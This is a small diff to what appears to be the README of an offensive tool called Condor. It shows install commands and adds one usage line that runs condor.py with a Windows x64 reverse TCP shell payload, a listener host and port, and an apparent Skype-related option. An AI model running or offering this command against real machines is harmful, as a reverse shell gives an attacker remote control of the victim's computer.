@@ -39,4 +39,6 @@ $ git clone https://github.com/MrEmpy/Condor.git
 $ cd Condor
 $ chmod +x install.sh
 $ sudo ./install.sh
+...
+$ python3 condor.py -p windows/x64/shell/reverse_tcp -lh <LOCAL HOST> -lp <LOCAL PORT> -i skype
 ```
